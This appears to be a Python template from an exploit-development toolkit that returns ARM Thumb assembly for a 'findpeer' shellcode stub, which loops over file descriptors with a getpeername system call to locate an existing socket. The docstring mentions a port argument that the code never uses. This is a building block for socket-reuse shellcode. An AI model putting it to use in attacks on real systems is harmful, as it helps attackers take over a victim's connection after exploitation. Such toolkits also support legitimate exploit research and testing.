# find a peer

def generate():
    """find a socket, which is connected to the specified port in thumb mode
    Leaves socket in r0 reg.

    argument:
        port (int/str): specific port

    backup:
        r6: indicates found socket/file descriptor
    """

    sc = """
findpeer_1:
    subs r5, r5, r5
    subs r5, r5, #1
    mov r3, sp
looplabel_2:
    mov sp, r3
    adds r5, r5, #1
    mov r0, r5
    movs r2, #4
    push {r2}
    mov r2, sp
    add  r1, sp, #32
    subs r7, r7, r7
    adds r7, r7, #255
    adds r7, r7, #32
    svc 1
    cmp r0, #0
    bne looplabel_2
    mov r6, r5
    """
    return sc
